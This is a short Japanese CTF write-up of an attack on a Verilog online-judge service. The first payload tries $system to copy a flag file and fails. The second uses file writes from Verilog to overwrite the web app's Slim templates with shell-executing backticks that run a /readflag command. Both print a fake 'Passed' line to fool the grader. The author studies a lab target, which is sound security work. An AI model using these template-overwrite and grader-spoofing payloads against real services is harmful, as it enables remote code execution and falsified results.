https://chatgpt.com/c/68aae667-1fe8-8329-964a-8d3d71c02eda

下記の感じでverilogを書いてローカルで実行してみた。
$systemで外部コマンドを実行できるらしい。

```verilog
module Crossbar_2x2_4bit(
  input  [3:0] in1, in2,
  input        control,
  output [3:0] out1, out2
);
  // 何でもOK
  assign out1 = control ? in1 : in2;
  assign out2 = control ? in2 : in1;

  integer rc;
  initial begin
    // 公開ディレクトリに書き出す（絶対パスでも相対パスでもOK）
    rc = $system("/flag > /app/app/presentation/public/f.txt");

    // 判定は最後の1行だけ見るので自分で Passed を出して終了
    $display("Passed");
    $finish;
  end
endmodule
```

これだと、
oj-1     | Judge output: judge: Program not runnable, 1 errors.
oj-1     | Judge error: module.v:13: Error: System task/function $system() is not defined by any module.
oj-1     | Judge status: 1

みたいなログが出てしまう。つまり、$systemが未定義で使えないらしい。
https://github.com/steveicarus/iverilog/issues/538

----

下記をやるとmarker.txtが書き込まれることは確認できた。

```verilog
module Crossbar_2x2_4bit(
  input  [3:0] in1, in2,
  input        control,
  output [3:0] out1, out2
);
  assign out1 = control ? in1 : in2;
  assign out2 = control ? in2 : in1;

  integer fd;
  initial begin
    // マーカー（書き込み確認用）
    fd = $fopen("/app/app/presentation/public/marker.txt", "w");
    $fdisplay(fd, "marker ok");
    $fclose(fd);

    // 1) submission 詳細ページのテンプレ（未表示ならチャンス大）
    fd = $fopen("/app/app/presentation/views/submission.slim", "w");
    $fdisplay(fd, "h1 PWN submission");
    $fdisplay(fd, "pre");
    $fdisplay(fd, "  = `/readflag give me the flag`");
    $fclose(fd);

    // 2) problems 一覧（まだ誰も見てなければ）
    fd = $fopen("/app/app/presentation/views/problems.slim", "w");
    $fdisplay(fd, "h1 PWN problems");
    $fdisplay(fd, "pre");
    $fdisplay(fd, "  = `/readflag give me the flag`");
    $fclose(fd);

    // 3) problem 詳細（未キャッシュなら）
    fd = $fopen("/app/app/presentation/views/problem.slim", "w");
    $fdisplay(fd, "h1 PWN problem");
    $fdisplay(fd, "pre");
    $fdisplay(fd, "  = `/readflag give me the flag`");
    $fclose(fd);

    // 4) submissions 一覧（未キャッシュなら）
    fd = $fopen("/app/app/presentation/views/submissions.slim", "w");
    $fdisplay(fd, "h1 PWN submissions");
    $fdisplay(fd, "pre");
    $fdisplay(fd, "  = `/readflag give me the flag`");
    $fclose(fd);

    // 採点は最後の行のみ見るので念のため
    $display("Passed");
    $finish;
  end
endmodule
```


これやったらいけた。
verilogからのファイルの書き込みはできるということか。

